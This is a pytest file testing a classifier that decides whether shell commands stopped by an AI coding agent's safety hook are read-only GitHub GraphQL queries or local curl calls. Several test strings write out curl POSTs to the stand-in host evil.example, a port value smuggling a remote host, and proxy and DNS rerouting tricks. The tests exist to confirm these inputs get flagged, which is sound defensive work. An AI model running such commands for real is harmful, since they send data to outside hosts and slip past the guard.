"""Behavior tests for the classifier behind claude-arbiter's second look.

When cc-safety-net stops a shell command on a request rule (arbiter-writes/gh-api-write or curl-write),
claude-arbiter reruns the engine without those rules and then asks classify_requests.py whether every request in
the command and in the scripts it runs is a read. Each case here is a command, or a script it runs, with the verdict
it must get. Anything the classifier cannot account for must ask, so most cases pin a way to ask.
Run from the repository root:

    uv run --no-project --with pytest pytest -p no:cacheprovider tests/claude-arbiter
"""

import importlib.util
import pathlib

import pytest

REPOSITORY = pathlib.Path(__file__).resolve().parents[2]
ARBITER = REPOSITORY / "home" / "apps" / "claude-code" / "arbiter"
RULEBOOK = ARBITER / "cc-safety-net" / "rules" / "arbiter-writes" / "rulebook.json"
FIXTURES = pathlib.Path(__file__).resolve().parent / "fixtures"

GH_API_WRITE = "custom.arbiter-writes/gh-api-write"
CURL_WRITE = "custom.arbiter-writes/curl-write"


def load_classifier():
    spec = importlib.util.spec_from_file_location(
        "classify_requests", ARBITER / "classify_requests.py"
    )
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


classifier = load_classifier()


@pytest.fixture(autouse=True)
def plain_environment(monkeypatch, tmp_path):
    """No proxy variables and a home without a curlrc, whatever the shell running the tests has."""
    for name in list(__import__("os").environ):
        if name.lower().endswith("_proxy") or name in ("CURL_HOME", "XDG_CONFIG_HOME"):
            monkeypatch.delenv(name)
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setenv("HOME", str(home))


def classify(command, tmp_path, rule=GH_API_WRITE, scripts=()):
    """scripts: paths as the engine's trace names them, relative to tmp_path or absolute."""
    traced = []
    for script in scripts:
        resolved = (
            pathlib.Path(script)
            if pathlib.Path(script).is_absolute()
            else tmp_path / script
        )
        traced.append({"path": str(script), "bytes": resolved.stat().st_size})
    return classifier.classify(
        command=command,
        cwd=str(tmp_path),
        scripts=traced,
        rule=rule,
        rulebook=str(RULEBOOK),
    )


def write_script(tmp_path, name, text):
    path = tmp_path / name
    path.write_text(text)
    path.chmod(0o755)
    return name


def copy_fixture(tmp_path, name):
    return write_script(tmp_path, name, (FIXTURES / name).read_text())


def assert_reads(verdict):
    assert verdict.reads, verdict.reason


def assert_asks(verdict, because=None):
    assert not verdict.reads, "expected an ask, got a read"
    if because is not None:
        assert because in verdict.reason, verdict.reason


# --- GraphQL through gh api ----------------------------------------------------------------------------------------


def test_a_comment_fetcher_script_with_one_graphql_query_reads(tmp_path):
    script = copy_fixture(tmp_path, "pending-comments.sh")
    assert_reads(
        classify(f"./{script} 1 > comments.json", tmp_path, scripts=[f"./{script}"])
    )


def test_a_script_whose_first_query_hides_later_mutations_asks(tmp_path):
    script = copy_fixture(tmp_path, "stage-draft-review.sh")
    assert_asks(
        classify(f"bash {script} 17 body", tmp_path, scripts=[script]), "mutation"
    )


def test_a_script_with_a_query_a_mutation_and_a_push_asks(tmp_path):
    script = copy_fixture(tmp_path, "query-then-push.sh")
    assert_asks(classify(f"./{script}", tmp_path, scripts=[f"./{script}"]), "mutation")


def test_a_script_reached_through_cd_is_found_by_its_size(tmp_path):
    (tmp_path / "sub").mkdir()
    copy_fixture(tmp_path / "sub", "pending-comments.sh")
    assert_reads(
        classify(
            f"cd {tmp_path}/sub && ./pending-comments.sh 1",
            tmp_path.parent,
            scripts=[str(tmp_path / "sub" / "pending-comments.sh")],
        )
    )
    verdict = classifier.classify(
        command=f"cd {tmp_path}/sub && ./pending-comments.sh 1",
        cwd=str(tmp_path),
        scripts=[
            {
                "path": "./pending-comments.sh",
                "bytes": (tmp_path / "sub" / "pending-comments.sh").stat().st_size,
            }
        ],
        rule=GH_API_WRITE,
        rulebook=str(RULEBOOK),
    )
    assert_reads(verdict)


def test_a_script_the_trace_names_no_path_for_asks(tmp_path):
    """The engine's secret redactor can replace a trace step's path, so the classifier cannot tell which file it read."""
    script = copy_fixture(tmp_path, "pending-comments.sh")
    command = (
        f"./{script} 1 > out.json; gh api graphql -f query='query{{viewer{{login}}}}'"
    )
    for step in (
        {"path": None, "bytes": (tmp_path / script).stat().st_size},
        {"path": "<redacted>", "bytes": (tmp_path / script).stat().st_size},
    ):
        verdict = classifier.classify(
            command=command,
            cwd=str(tmp_path),
            scripts=[step],
            rule=GH_API_WRITE,
            rulebook=str(RULEBOOK),
        )
        assert_asks(verdict, "no path")


def test_a_script_that_cannot_be_found_asks(tmp_path):
    verdict = classifier.classify(
        command="./gone.sh",
        cwd=str(tmp_path),
        scripts=[{"path": "./gone.sh", "bytes": 10}],
        rule=GH_API_WRITE,
        rulebook=str(RULEBOOK),
    )
    assert_asks(verdict, "gone.sh")


def test_a_script_whose_size_differs_from_the_traced_one_asks(tmp_path):
    script = copy_fixture(tmp_path, "pending-comments.sh")
    verdict = classifier.classify(
        command=f"./{script}",
        cwd=str(tmp_path),
        scripts=[{"path": f"./{script}", "bytes": 3}],
        rule=GH_API_WRITE,
        rulebook=str(RULEBOOK),
    )
    assert_asks(verdict, script)


def test_an_inline_query_reads(tmp_path):
    command = (
        'gh api graphql -f query=\'query { repository(owner:"o", name:"r") { pullRequest(number:1) '
        "{ comments(first:50) { nodes { id body } } } } }' --jq '.data' > out.json"
    )
    assert_reads(classify(command, tmp_path))


def test_a_shorthand_query_reads(tmp_path):
    assert_reads(classify("gh api graphql -f query='{ viewer { login } }'", tmp_path))


def test_a_query_after_comment_lines_reads(tmp_path):
    assert_reads(
        classify(
            "gh api graphql -f query='\n# who am I\nquery { viewer { login } }'",
            tmp_path,
        )
    )


def test_a_query_in_the_equals_spelling_reads(tmp_path):
    assert_reads(
        classify(
            "gh api graphql --raw-field=query='query{viewer{login}}' --paginate",
            tmp_path,
        )
    )


def test_an_inline_mutation_asks(tmp_path):
    command = "gh api graphql -f query='mutation { minimizeComment(input:{subjectId:\"x\", classifier:OUTDATED}) { minimizedComment { isMinimized } } }'"
    assert_asks(classify(command, tmp_path), "mutation")


def test_a_subscription_asks(tmp_path):
    assert_asks(classify("gh api graphql -f query='subscription { x }'", tmp_path))


def test_mutation_anywhere_in_the_command_asks(tmp_path):
    command = "gh api graphql -f query='query{viewer{login}}'; echo mutation"
    assert_asks(classify(command, tmp_path), "mutation")


def test_a_query_file_reads(tmp_path):
    (tmp_path / "q.graphql").write_text("query($pr: Int!) { viewer { login } }\n")
    assert_reads(classify("gh api graphql -F query=@q.graphql -F pr=3", tmp_path))


def test_a_mutation_file_asks(tmp_path):
    (tmp_path / "m.graphql").write_text(
        'mutation { resolveReviewThread(input:{threadId:"x"}) { thread { id } } }\n'
    )
    assert_asks(classify("gh api graphql -F query=@m.graphql", tmp_path), "mutation")


def test_a_missing_query_file_asks(tmp_path):
    assert_asks(
        classify("gh api graphql -F query=@missing.graphql", tmp_path),
        "missing.graphql",
    )


def test_a_query_file_from_standard_input_asks(tmp_path):
    assert_asks(classify("cat q.graphql | gh api graphql -F query=@-", tmp_path))


def test_a_document_held_in_a_variable_asks(tmp_path):
    assert_asks(classify('Q=$(cat q.graphql); gh api graphql -f query="$Q"', tmp_path))


def test_a_document_with_an_expansion_inside_asks(tmp_path):
    assert_asks(classify('gh api graphql -f query="query { $FIELDS }"', tmp_path))


def test_two_query_fields_ask(tmp_path):
    assert_asks(
        classify("gh api graphql -f query='query{a}' -f query='query{b}'", tmp_path)
    )


def test_dynamic_variables_beside_a_literal_query_read(tmp_path):
    command = 'gh api graphql -f query=\'query($n:Int!){ x(n:$n) }\' -F n="$N" -f owner="${REPO%%/*}"'
    assert_reads(classify(command, tmp_path))


def test_graphql_with_a_method_asks(tmp_path):
    assert_asks(classify("gh api graphql -X POST -f query='query{a}'", tmp_path))


def test_graphql_with_an_input_file_asks(tmp_path):
    assert_asks(classify("gh api graphql --input body.json", tmp_path))


def test_graphql_through_its_full_url_reads(tmp_path):
    assert_reads(
        classify(
            "gh api https://api.github.com/graphql -f query='query{viewer{login}}'",
            tmp_path,
        )
    )


def test_an_unknown_gh_api_flag_asks(tmp_path):
    assert_asks(
        classify("gh api graphql --frobnicate -f query='query{a}'", tmp_path),
        "--frobnicate",
    )


def test_a_rest_call_with_a_field_asks(tmp_path):
    assert_asks(classify("gh api repos/o/r/issues/1/comments -f body=hi", tmp_path))


def test_a_rest_get_with_fields_asks(tmp_path):
    assert_asks(classify("gh api -X GET repos/o/r/pulls -f state=open", tmp_path))


def test_a_rest_read_without_fields_beside_a_query_reads(tmp_path):
    command = "gh api repos/o/r/pulls/1/files --paginate --jq '.[].filename'; gh api graphql -f query='query{a}'"
    assert_reads(classify(command, tmp_path))


def test_a_query_inside_bash_c_reads(tmp_path):
    assert_reads(
        classify("bash -c \"gh api graphql -f query='query{viewer{login}}'\"", tmp_path)
    )


def test_a_mutation_inside_bash_c_asks(tmp_path):
    assert_asks(
        classify("bash -lc \"gh api graphql -f query='mutation{a}'\"", tmp_path)
    )


def test_bash_c_with_an_expansion_asks(tmp_path):
    assert_asks(
        classify("bash -c \"gh api graphql -f query='query{a}' -F n=$N\"", tmp_path)
    )


def test_a_gh_call_inside_python_c_asks(tmp_path):
    command = (
        "gh api graphql -f query='query{a}'; "
        'python3 -c \'import subprocess; subprocess.run(["gh", "api", "-X", "POST", "repos/o/r/x"])\''
    )
    assert_asks(classify(command, tmp_path))


def test_a_gh_call_in_a_python_heredoc_asks(tmp_path):
    command = "gh api graphql -f query='query{a}'\npython3 - <<'EOF'\nimport os\nos.system('gh api -X POST repos/o/r/x')\nEOF"
    assert_asks(classify(command, tmp_path))


def test_eval_asks(tmp_path):
    assert_asks(
        classify("gh api graphql -f query='query{a}'; eval \"$X\"", tmp_path), "eval"
    )


def test_gh_under_xargs_asks(tmp_path):
    assert_asks(
        classify("cat docs | xargs -I{} gh api graphql -f query={}", tmp_path), "xargs"
    )


def test_gh_under_timeout_and_nice_reads(tmp_path):
    assert_reads(
        classify("nice -n 19 timeout 60 gh api graphql -f query='query{a}'", tmp_path)
    )


def test_an_unbalanced_quote_asks(tmp_path):
    assert_asks(classify("gh api graphql -f query='query{a}", tmp_path))


def test_a_stop_the_classifier_cannot_see_asks(tmp_path):
    assert_asks(classify("echo nothing to see", tmp_path), "found no")


def test_a_rulebook_flag_the_classifier_does_not_know_asks(tmp_path):
    rulebook = tmp_path / "rulebook.json"
    original = __import__("json").loads(RULEBOOK.read_text())
    for rule in original["rules"]:
        if rule["name"] == "gh-api-write":
            rule["block_args"].append("--brand-new-flag")
    rulebook.write_text(__import__("json").dumps(original))
    verdict = classifier.classify(
        command="gh api graphql -f query='query{a}'",
        cwd=str(tmp_path),
        scripts=[],
        rule=GH_API_WRITE,
        rulebook=str(rulebook),
    )
    assert_asks(verdict, "--brand-new-flag")


# --- curl to the local dev stack -----------------------------------------------------------------------------------


def test_a_localhost_post_reads(tmp_path):
    command = "curl -s -H 'Content-Type: application/json' http://localhost:4301/internal/graphql -d '{\"query\":\"mutation X { x }\"}'"
    assert_reads(classify(command, tmp_path, rule=CURL_WRITE))


def test_a_loopback_delete_reads(tmp_path):
    assert_reads(
        classify(
            "curl -sS -X DELETE 'http://127.0.0.1:9230/subcontractors'",
            tmp_path,
            rule=CURL_WRITE,
        )
    )


def test_an_ipv6_loopback_post_reads(tmp_path):
    assert_reads(
        classify(
            "curl -fsS -XPOST 'http://[::1]:9200/_refresh'", tmp_path, rule=CURL_WRITE
        )
    )


def test_a_port_from_the_environment_reads(tmp_path):
    assert_reads(
        classify(
            'curl -s -X POST "http://localhost:${API_PORT}/print" -d @body.json',
            tmp_path,
            rule=CURL_WRITE,
        )
    )


def test_a_port_assigned_digits_reads(tmp_path):
    assert_reads(
        classify(
            'PORT=4301; curl -s -X POST "http://localhost:$PORT/x" -d a=b',
            tmp_path,
            rule=CURL_WRITE,
        )
    )


def test_a_port_assigned_anything_else_asks(tmp_path):
    command = (
        "PORT='80@evil.example'; curl -s -X POST \"http://localhost:$PORT/x\" -d a=b"
    )
    assert_asks(classify(command, tmp_path, rule=CURL_WRITE), "PORT")


def test_a_scheme_less_localhost_reads(tmp_path):
    assert_reads(
        classify(
            "curl -s -XPOST localhost:9200/_bulk --data-binary @bulk.ndjson",
            tmp_path,
            rule=CURL_WRITE,
        )
    )


def test_a_remote_post_asks(tmp_path):
    assert_asks(
        classify(
            "curl -s -X POST https://api.example.com/v1/x -d a=b",
            tmp_path,
            rule=CURL_WRITE,
        ),
        "api.example.com",
    )


def test_a_localhost_and_remote_mix_asks(tmp_path):
    command = "curl -s -X POST http://localhost:4301/x -d a=b && curl -s -X POST https://example.com/y -d c=d"
    assert_asks(classify(command, tmp_path, rule=CURL_WRITE), "example.com")


def test_a_lookalike_host_asks(tmp_path):
    assert_asks(
        classify(
            "curl -s -X POST http://localhost.evil.example/x -d a=b",
            tmp_path,
            rule=CURL_WRITE,
        )
    )


def test_userinfo_before_a_remote_host_asks(tmp_path):
    assert_asks(
        classify(
            "curl -s -X POST http://localhost@evil.example/x -d a=b",
            tmp_path,
            rule=CURL_WRITE,
        )
    )


def test_a_url_in_a_variable_asks(tmp_path):
    assert_asks(classify('curl -s -X POST "$URL" -d a=b', tmp_path, rule=CURL_WRITE))


def test_a_host_built_from_a_variable_asks(tmp_path):
    assert_asks(
        classify(
            'curl -s -X POST "http://localhost${SUFFIX}/x" -d a=b',
            tmp_path,
            rule=CURL_WRITE,
        )
    )


def test_a_url_glob_over_hosts_asks(tmp_path):
    assert_asks(
        classify(
            "curl -s -X POST 'http://{localhost,evil.example}/x' -d a=b",
            tmp_path,
            rule=CURL_WRITE,
        )
    )


@pytest.mark.parametrize(
    "option",
    [
        "-x http://proxy.example:3128",
        "--proxy http://proxy.example:3128",
        "--resolve localhost:80:203.0.113.5",
        "--connect-to localhost:80:evil.example:80",
        "-K extra.curlrc",
        "--unix-socket /run/x.sock",
        "--doh-url https://doh.example/dns-query",
    ],
)
def test_options_that_reroute_the_request_ask(tmp_path, option):
    assert_asks(
        classify(
            f"curl -s -X POST {option} http://localhost:4301/x -d a=b",
            tmp_path,
            rule=CURL_WRITE,
        )
    )


def test_a_second_url_after_next_asks(tmp_path):
    command = (
        "curl -s http://localhost:4301/x --next -X POST https://evil.example/y -d a=b"
    )
    assert_asks(classify(command, tmp_path, rule=CURL_WRITE))


def test_a_proxy_assignment_in_the_command_asks(tmp_path):
    assert_asks(
        classify(
            "https_proxy=http://proxy.example:3128 curl -X POST http://localhost/x -d a",
            tmp_path,
            rule=CURL_WRITE,
        )
    )


def test_a_proxy_in_the_environment_asks(tmp_path, monkeypatch):
    monkeypatch.setenv("ALL_PROXY", "socks5://proxy.example:1080")
    assert_asks(
        classify("curl -X POST http://localhost/x -d a", tmp_path, rule=CURL_WRITE),
        "ALL_PROXY",
    )


def test_a_curlrc_in_the_home_asks(tmp_path):
    (pathlib.Path(__import__("os").environ["HOME"]) / ".curlrc").write_text(
        "proxy = http://proxy.example:3128\n"
    )
    assert_asks(
        classify("curl -X POST http://localhost/x -d a", tmp_path, rule=CURL_WRITE),
        ".curlrc",
    )


def test_an_unknown_curl_option_asks(tmp_path):
    assert_asks(
        classify(
            "curl --frobnicate -X POST http://localhost/x -d a",
            tmp_path,
            rule=CURL_WRITE,
        ),
        "--frobnicate",
    )


def test_a_curl_mention_the_classifier_cannot_follow_asks(tmp_path):
    command = "curl -X POST http://localhost/x -d a; watch -n 5 'curl -X POST https://evil.example/y -d b'"
    assert_asks(classify(command, tmp_path, rule=CURL_WRITE))


def test_quoted_text_that_looks_like_a_substitution_is_still_a_mention(tmp_path):
    command = "curl -X POST http://localhost/x -d a; watch '$(curl -X POST https://evil.example/y -d b)'"
    assert_asks(classify(command, tmp_path, rule=CURL_WRITE), "watch")


def test_a_curl_stop_beside_a_graphql_mutation_asks(tmp_path):
    command = (
        "curl -X POST http://localhost/x -d a; gh api graphql -f query='mutation{a}'"
    )
    assert_asks(classify(command, tmp_path, rule=CURL_WRITE), "mutation")


def test_a_curl_stop_beside_a_graphql_query_reads(tmp_path):
    command = (
        "curl -sS -X POST http://localhost/x -d a; gh api graphql -f query='query{a}'"
    )
    assert_reads(classify(command, tmp_path, rule=CURL_WRITE))


def test_a_local_script_that_posts_to_localhost_reads(tmp_path):
    script = write_script(
        tmp_path,
        "seed.sh",
        '#!/usr/bin/env bash\nset -e\ncurl -fsS -X POST "http://localhost:${API_PORT}/seed" -d @seed.json\n',
    )
    assert_reads(
        classify(f"bash {script}", tmp_path, rule=CURL_WRITE, scripts=[script])
    )


def test_case_statements_are_read_through_their_patterns(tmp_path):
    script = write_script(
        tmp_path,
        "rig.sh",
        "#!/usr/bin/env bash\n"
        'case "${1:-}" in\n'
        '  reset | wipe) curl -fsS -X DELETE "http://localhost:${OS_PORT}/dev-*" ;;\n'
        "  (status)\n"
        '    case "$(curl -s localhost:9200/_cluster/health)" in *green*) echo up;; esac\n'
        "    ;;\n"
        "  *) echo usage >&2; exit 1\n"
        "esac\n",
    )
    assert_reads(
        classify(
            f"./{script} reset", tmp_path, rule=CURL_WRITE, scripts=[f"./{script}"]
        )
    )


def test_a_case_branch_that_posts_remotely_asks(tmp_path):
    command = 'case "$1" in up) curl -X POST http://localhost/x -d a ;; down) curl -X POST https://evil.example/y -d b ;; esac'
    assert_asks(classify(command, tmp_path, rule=CURL_WRITE), "evil.example")


def test_a_heredoc_written_script_that_posts_remotely_asks(tmp_path):
    command = "cat > post.sh <<'EOF'\ncurl -X POST https://evil.example/x -d a\nEOF\ncurl -X POST http://localhost/y -d b"
    assert_asks(classify(command, tmp_path, rule=CURL_WRITE), "evil.example")
